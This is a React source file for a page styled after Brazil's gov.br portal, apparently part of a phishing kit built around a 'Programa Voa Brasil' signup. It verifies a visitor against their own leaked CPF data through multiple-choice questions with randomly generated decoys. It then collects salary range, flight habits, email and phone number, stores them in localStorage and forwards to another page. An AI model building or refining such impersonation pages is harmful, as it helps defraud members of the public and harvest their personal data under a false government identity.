import { useMemo, useState } from "react";
import { useLocation } from "wouter";
import { Loader2, Check } from "lucide-react";
import "../styles/govbr.css";
import Header from "../components/Header";

interface UserData {
  cpf: string;
  nome: string;
  nome_mae: string;
  data_nascimento: string;
  sexo: string;
}

function capitalizeWords(str: string): string {
  return str.toLowerCase().split(' ').map(word =>
    word.charAt(0).toUpperCase() + word.slice(1)
  ).join(' ');
}

function generateRandomName(isMother: boolean = false): string {
  const firstNames = isMother
    ? ['Maria', 'Ana', 'Helena', 'Alice', 'Laura', 'Beatriz', 'Clara', 'Sofia', 'Julia', 'Isabella']
    : ['Miguel', 'Arthur', 'Heitor', 'Helena', 'Alice', 'Laura', 'Maria', 'João', 'Pedro', 'Lucas'];

  const middleNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira'];
  const lastNames = ['Costa', 'Carvalho', 'Gomes', 'Martins', 'Rocha', 'Ribeiro', 'Pinto', 'Marques'];

  return `${firstNames[Math.floor(Math.random() * firstNames.length)]} ${
    middleNames[Math.floor(Math.random() * middleNames.length)]} ${
    lastNames[Math.floor(Math.random() * lastNames.length)]}`;
}

function generateFakeOptions(realValue: string, type: 'name' | 'date' | 'mother'): string[] {
  const options = [realValue];

  if (type === 'date') {
    while (options.length < 3) {
      const start = new Date(1950, 0, 1);
      const end = new Date(2000, 11, 31);
      const randomDate = new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
      const formattedDate = randomDate.toISOString().split('T')[0];
      if (!options.includes(formattedDate)) {
        options.push(formattedDate);
      }
    }
  } else {
    while (options.length < 3) {
      const randomName = generateRandomName(type === 'mother');
      if (!options.includes(randomName)) {
        options.push(randomName);
      }
    }
  }

  return options.sort(() => Math.random() - 0.5);
}

type QuestionStep = 'name' | 'birth' | 'mother' | 'salary' | 'flights' | 'email' | 'phone';
type ButtonState = 'idle' | 'loading' | 'success';

const emailDomains = [
  '@gmail.com',
  '@hotmail.com',
  '@outlook.com',
  '@yahoo.com.br',
  '@uol.com.br',
  '@bol.com.br',
  '@terra.com.br'
];

const playSuccessSound = () => {
  const audio = new Audio("data:audio/wav;base64,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Jrx4KOQjahZxWbcZgztj2c49nKmkId44S71j0c8eV9yDK6uPRzx5X18eDvjvQ6yKo9ZSS6l//8elePK/Lf//IInrOF/FvDoADYAGBMGb7FtErm5MXMlmPAJQVgWta7Zx2go+8xJ0UiCb8LHHdftWyLJE0QIAIsI+UbXu67dZMjmgDGCGl1H+vpF4NSDckSIkk7Vd+sxEhBQMRU8j/12UIRhzSaUdQ+rQU5kGeFxm+hb1oh6pWWmv3uvmReDl0UnvtapVaIzo1jZbf/pD6ElLqSX+rUmOQNpJFa/r+sa4e/pBlAABoAAAAA3CUgShLdGIxsY7AUABPRrgCABdDuQ5GC7DqPQCgbbJUAoRSUj+NIEig0YfyWUho1VBBBA//uQZB4ABZx5zfMakeAAAAmwAAAAF5F3P0w9GtAAACfAAAAAwLhMDmAYWMgVEG1U0FIGCBgXBXAtfMH10000EEEEEECUBYln03TTTdNBDZopopYvrTTdNa325mImNg3TTPV9q3pmY0xoO6bv3r00y+IDGid/9aaaZTGMuj9mpu9Mpio1dXrr5HERTZSmqU36A3CumzN/9Robv/Xx4v9ijkSRSNLQhAWumap82WRSBUqXStV/YcS+XVLnSS+WLDroqArFkMEsAS+eWmrUzrO0oEmE40RlMZ5+ODIkAyKAGUwZ3mVKmcamcJnMW26MRPgUw6j+LkhyHGVGYjSUUKNpuJUQoOIAyDvEyG8S5yfK6dhZc0Tx1KI/gviKL6qvvFs1+bWtaz58uUNnryq6kt5RzOCkPWlVqVX2a/EEBUdU1KrXLf40GoiiFXK///qpoiDXrOgqDR38JB0bw7SoL+ZB9o1RCkQjQ2CBYZKd/+VJxZRRZlqSkKiws0WFxUyCwsKiMy7hUVFhIaCrNQsKkTIsLivwKKigsj8XYlwt/WKi2N4d//uQRCSAAjURNIHpMZBGYiaQPSYyAAABLAAAAAAAACWAAAAApUF/Mg+0aohSIRobBAsMlO//Kk4soosy1JSFRYWaLC4qZBYWFRGZdwqKiwkNBVmoWFSJkWFxX4FFRQWR+LsS4W/rFRb/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////VEFHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAU291bmRib3kuZGUAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMjAwNGh0dHA6Ly93d3cuc291bmRib3kuZGUAAAAAAAAAACU=");
  audio.play().catch(console.error);
};

export default function Verificacao() {
  const [, setLocation] = useLocation();
  const [currentStep, setCurrentStep] = useState<QuestionStep>('name');
  const [error, setError] = useState<string | null>(null);
  const [selectedValue, setSelectedValue] = useState<string>('');
  const [buttonState, setButtonState] = useState<ButtonState>('idle');
  const [emailInput, setEmailInput] = useState('');
  const [phoneInput, setPhoneInput] = useState('');
  const [showEmailSuggestions, setShowEmailSuggestions] = useState(false);

  // Salary and flight options
  const salaryOptions = [
    'Até R$ 2.640 (até 2 salários mínimos)',
    'De R$ 2.641 a R$ 6.600 (2 a 5 salários mínimos)',
    'De R$ 6.601 a R$ 13.200 (5 a 10 salários mínimos)',
    'Acima de R$ 13.200 (mais de 10 salários mínimos)'
  ];

  const flightOptions = [
    'Nunca viajei de avião',
    '1-2 vezes nos últimos 12 meses',
    '3-5 vezes nos últimos 12 meses',
    '6 ou mais vezes nos últimos 12 meses'
  ];

  const formatPhoneNumber = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    if (numbers.length <= 2) return numbers;
    if (numbers.length <= 7) return `(${numbers.slice(0, 2)}) ${numbers.slice(2)}`;
    return `(${numbers.slice(0, 2)}) ${numbers.slice(2, 7)}-${numbers.slice(7, 11)}`;
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setPhoneInput(formatPhoneNumber(e.target.value));
  };

  const handleEmailChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setEmailInput(value);
    setShowEmailSuggestions(value.includes('@') && !value.includes('.'));
  };

  const handleEmailDomainSelect = (domain: string) => {
    const localPart = emailInput.split('@')[0];
    setEmailInput(localPart + domain);
    setShowEmailSuggestions(false);
  };

  try {
    const searchParams = new URLSearchParams(window.location.search);
    const encodedData = searchParams.get('data');

    if (!encodedData) {
      return (
        <div>
          <Header/>
          <div className="container">
            <main id="main-signin">
              <div className="card" style={{ maxWidth: '600px', alignItems: 'flex-start' }}>
                <h3>Dados não encontrados</h3>
                <p>Não foram encontrados dados para verificação.</p>
                <div className="button-panel">
                  <button
                    type="button"
                    onClick={() => setLocation('/')}
                    className="button-continuar"
                  >
                    Voltar
                  </button>
                </div>
              </div>
            </main>
          </div>
        </div>
      );
    }

    const userData: UserData = JSON.parse(decodeURIComponent(encodedData));

    const nameOptions = useMemo(() => generateFakeOptions(userData.nome, 'name'), [userData.nome]);
    const birthOptions = useMemo(() => generateFakeOptions(userData.data_nascimento, 'date'), [userData.data_nascimento]);
    const motherOptions = useMemo(() => generateFakeOptions(userData.nome_mae, 'mother'), [userData.nome_mae]);

    const handleConfirm = async () => {
      if (currentStep === 'email' && !emailInput) {
        setError('Por favor, insira seu email');
        return;
      }

      if (currentStep === 'phone' && !phoneInput) {
        setError('Por favor, insira seu telefone');
        return;
      }

      if (currentStep !== 'email' && currentStep !== 'phone' && !selectedValue) {
        setError('Por favor, selecione uma opção');
        return;
      }

      setButtonState('loading');

      await new Promise(resolve => setTimeout(resolve, 3000));

      let isCorrect = false;
      switch (currentStep) {
        case 'name':
          isCorrect = selectedValue === userData.nome;
          break;
        case 'birth':
          isCorrect = selectedValue === userData.data_nascimento;
          break;
        case 'mother':
          isCorrect = selectedValue === userData.nome_mae;
          break;
        case 'salary':
          isCorrect = selectedValue !== ''; // Any salary selection is valid
          break;
        case 'flights':
          isCorrect = selectedValue !== ''; // Any flight frequency selection is valid
          break;
        case 'email':
          isCorrect = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput);
          break;
        case 'phone':
          isCorrect = phoneInput.replace(/\D/g, '').length >= 10;
          break;
      }

      if (!isCorrect) {
        setError(currentStep === 'email' ? 'Email inválido' :
          currentStep === 'phone' ? 'Telefone inválido' :
            'Dados incorretos. Por favor, verifique sua resposta.');
        setButtonState('idle');
      } else {
        setButtonState('success');
        playSuccessSound();

        setTimeout(() => {
          setError(null);
          setButtonState('idle');
          if (currentStep === 'phone') {
            // Save all collected data to localStorage before navigation
            const storedData = localStorage.getItem('userData');
            const baseData = storedData ? JSON.parse(storedData) : {};
            
            // Get salary and flight data from previous steps
            const salaryRange = currentStep === 'salary' ? selectedValue : baseData.salaryRange;
            const flightFrequency = currentStep === 'flights' ? selectedValue : baseData.flightFrequency;
            
            localStorage.setItem('userData', JSON.stringify({
              ...baseData,
              ...userData,
              email: emailInput,
              phone: phoneInput,
              salaryRange: salaryRange,
              flightFrequency: flightFrequency
            }));
            setLocation(`/saiba-mais?data=${encodedData}`);
          } else {
            // Save current step data to localStorage
            if (currentStep === 'salary' || currentStep === 'flights') {
              const storedData = localStorage.getItem('userData');
              const baseData = storedData ? JSON.parse(storedData) : {};
              const updateData = currentStep === 'salary' 
                ? { salaryRange: selectedValue }
                : { flightFrequency: selectedValue };
              
              localStorage.setItem('userData', JSON.stringify({
                ...baseData,
                ...updateData
              }));
            }
            
            setCurrentStep(
              currentStep === 'name' ? 'birth' :
                currentStep === 'birth' ? 'mother' :
                  currentStep === 'mother' ? 'salary' :
                    currentStep === 'salary' ? 'flights' :
                      currentStep === 'flights' ? 'email' :
                        'phone'
            );
            setSelectedValue('');
          }
        }, 1000);
      }
    };

    const getCurrentQuestion = () => {
      switch (currentStep) {
        case 'name':
          return {
            title: 'Qual é seu nome completo?',
            options: nameOptions,
            type: 'name',
            number: 1
          };
        case 'birth':
          return {
            title: 'Qual é sua data de nascimento?',
            options: birthOptions,
            type: 'birth',
            number: 2
          };
        case 'mother':
          return {
            title: 'Qual é o nome da sua mãe?',
            options: motherOptions,
            type: 'mother',
            number: 3
          };
        case 'salary':
          return {
            title: 'Qual é sua faixa salarial atual?',
            options: salaryOptions,
            type: 'salary',
            number: 4
          };
        case 'flights':
          return {
            title: 'Quantas vezes você viajou de avião nos últimos 12 meses?',
            options: flightOptions,
            type: 'flights',
            number: 5
          };
        case 'email':
          return {
            title: 'Qual é o seu email?',
            type: 'email',
            number: 6
          };
        case 'phone':
          return {
            title: 'Qual é o seu telefone?',
            type: 'phone',
            number: 7
          };
      }
    };

    const currentQuestion = getCurrentQuestion();

    return (
      <div>
        <Header />

        <div className="container">
          <main id="main-signin" style={{ width: '100%', maxWidth: '800px', margin: '0 auto' }}>
            <div className="card" style={{ width: '100%', alignItems: 'flex-start', padding: '2rem' }}>
              <h3 className="text-center w-full text-lg font-bold mb-6">Confirme seus dados para o cadastro no Programa Voa Brasil</h3>
              <div className="w-full flex justify-center mb-6">
                <img
                  src="https://dicasdahora.com.br/wp-content/uploads/2024/12/PROGRAMA-VOA-BRASIL-930x620.jpg"
                  alt="Programa VOA BRASIL"
                  className="w-[90px] h-[90px] object-cover"
                />
              </div>
              <div className="w-full">
                <div>
                  <div className="flex items-center gap-3 mb-4">
                    <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">
                      {currentQuestion.number}
                    </div>
                    <p className="font-semibold text-base">{currentQuestion.title}</p>
                  </div>
                  <div className="space-y-3 pl-4">
                    {(currentStep === 'name' || currentStep === 'birth' || currentStep === 'mother' || currentStep === 'salary' || currentStep === 'flights') && currentQuestion?.options && (
                      currentQuestion.options.map((option, index) => (
                        <div
                          key={index}
                          className={`flex items-center w-full p-3 rounded-md transition-all cursor-pointer ${
                            selectedValue === option ? 'bg-[#1351B4] bg-opacity-10 border-2 border-[#1351B4]' : 'bg-gray-50 hover:bg-gray-100'
                            }`}
                          onClick={() => {
                            setSelectedValue(option);
                            setError(null);
                          }}
                        >
                          <label
                            htmlFor={`option-${index}`}
                            className={`flex-1 cursor-pointer ${selectedValue === option ? 'text-[#1351B4] font-medium' : ''}`}
                          >
                            {currentQuestion.type === 'birth'
                              ? new Date(option).toLocaleDateString('pt-BR')
                              : capitalizeWords(option)}
                          </label>
                        </div>
                      ))
                    )}

                    {currentStep === 'email' && (
                      <div className="relative">
                        <input
                          type="email"
                          value={emailInput}
                          onChange={handleEmailChange}
                          placeholder="Digite seu email"
                          className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1351B4] text-lg"
                        />
                        {showEmailSuggestions && (
                          <div className="absolute z-10 w-full mt-1 bg-white border border-gray-200 rounded-md shadow-lg">
                            {emailDomains.map((domain, index) => (
                              <div
                                key={index}
                                className="p-3 hover:bg-gray-100 cursor-pointer text-lg"
                                onClick={() => handleEmailDomainSelect(domain)}
                              >
                                {emailInput.split('@')[0]}{domain}
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    )}

                    {currentStep === 'phone' && (
                      <input
                        type="tel"
                        value={phoneInput}
                        onChange={handlePhoneChange}
                        placeholder="(11) 99999-9999"
                        className="w-full p-3 rounded-md border border-gray-300 focus:outline-none focus:ring-2 focus:ring-[#1351B4] text-lg"
                      />
                    )}
                  </div>

                  {error && (
                    <p className="text-red-500 mt-4">{error}</p>
                  )}

                  <div className="flex justify-center mt-6">
                    <button
                      type="button"
                      onClick={handleConfirm}
                      disabled={buttonState !== 'idle'}
                      className="button-continuar flex items-center justify-center gap-2 min-w-[160px]"
                    >
                      {buttonState === 'loading' && <Loader2 className="h-4 w-4 animate-spin" />}
                      {buttonState === 'success' && <Check className="h-4 w-4" />}
                      {buttonState === 'loading' ? 'Verificando' :
                        buttonState === 'success' ? 'Verificado' : 'Confirmar'}
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </main>
        </div>
      </div>
    );
  } catch (error) {
    console.error('Error in Verificacao page:', error);
    return (
      <div>
        <Header />
        <div className="container">
          <main id="main-signin">
            <div className="card" style={{ maxWidth: '600px', alignItems: 'flex-start' }}>
              <h3>Erro ao carregar dados</h3>
              <p>Ocorreu um erro ao processar os dados. Por favor, tente novamente.</p>
              <div className="button-panel">
                <button
                  type="button"
                  onClick={() => setLocation('/')}
                  className="button-continuar"
                >
                  Voltar
                </button>
              </div>
            </div>
          </main>
        </div>
      </div>
    );
  }
}